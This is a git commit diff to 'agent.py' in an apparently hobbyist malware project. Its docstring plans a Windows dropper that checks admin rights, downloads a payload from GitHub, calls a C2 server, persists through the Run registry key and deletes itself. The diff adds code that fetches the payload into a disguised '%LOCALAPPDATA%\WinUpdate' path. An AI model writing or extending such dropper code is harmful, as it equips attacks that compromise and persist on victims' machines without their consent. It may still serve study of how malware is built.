01f91869f0b163e9795ae7580c1b7b3375dd303d
Clement <clement_392@hotmail.com>
2020-06-22 19:42:23 +0800

    Update agent.py

--- agent/agent.py
+++ agent/agent.py
@@ -1,12 +1,10 @@
 """
-This program is ran only on initial compromise.
+Always run on boot
 [X] It will first check if ran as administrator, and has internet connectivity.
 [] It will then download the payload hosted on github and save on disk.
 [] It will then do a *callback to the C2 to establish alive.
 [] It will then create persistence for the payload via [service | registry key].
 [] Lastly, it will delete itself off the disk.
-
-* callback will include
 """
 import ctypes  # An included library with Python install.
 import os
@@ -19,11 +17,13 @@ try:
 except ImportError:
     # this has been renamed in python 3
     import winreg
-from urllib.request import urlopen, URLError
+from urllib.request import urlopen, urlretrieve
+from urllib.error import URLError
 
 KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-HARMLESS_URL = r"https://raw.githubusercontent.com/notclement/iobdug_malware_py/master/harmless.py"
+PAYLOAD_URL = r"https://raw.githubusercontent.com/notclement/iobdug_malware_py/master/harmless"
 GOOGLE_DNS = 'http://www.google.com'
+PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
 
 
 def test_connectivity(google_dns):
@@ -55,13 +55,22 @@ def do_checks():
     """Does a series of checks including:
     1. checks if program is ran as administrator
     2. checks if there is internet connectivity
-    returns True only when both are True"""
-    return test_is_admin() and test_connectivity(GOOGLE_DNS)
+    returns True only when both are True
+    """
+    if test_is_admin() and test_connectivity(GOOGLE_DNS):
+        return 1
+
+
+def get_payload_to_path(url, path_to_hide):
+    """Reaches out to github to retrieve the payload"""
+    print(path_to_hide)
+    urlretrieve(url, path_to_hide)
 
 
 def main():
     if do_checks():
-        pass
+        print('Program is ran as administrator and has internet connectivity')
+    get_payload_to_path(PAYLOAD_URL, PATH_TO_HIDE)
 
 
 if __name__ == '__main__':
